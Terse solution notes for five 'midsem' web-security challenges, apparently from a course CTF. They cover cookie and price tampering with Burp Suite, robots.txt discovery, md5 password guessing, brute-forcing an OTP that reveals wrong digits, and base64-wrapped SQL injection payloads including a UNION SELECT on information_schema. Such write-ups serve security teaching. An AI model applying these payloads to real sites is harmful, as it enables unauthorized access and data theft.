# midsem1

Source code

Cookie true:md5true - flag in network

robots.txt - /quack allowed for user agent Quoccrome

# midsem2

burpsuite change price param

# midsem3

robots.txt - /super-secret-backup.zip

index.old -> password is just the md5 hash of username

admin, md5(admin) -> intercept with burp suite before redirecting to get hash

# midsem4

admin, admin

OTP: calls /api/verify_code/111111

Tells you which digit is wrong - brute force

# midsem5

/raw/base64_encoded number three times

Try 1 -> test

Try 2 -> flag

Try 3 -> 403

b64 encode 0' or id=3-- )

0' union select table_name, column_name from information_schema.columns-- )

Table collations has columns:

- id
- collation_name
- character_set_name
- is_default
- is_compiled
- sortlen







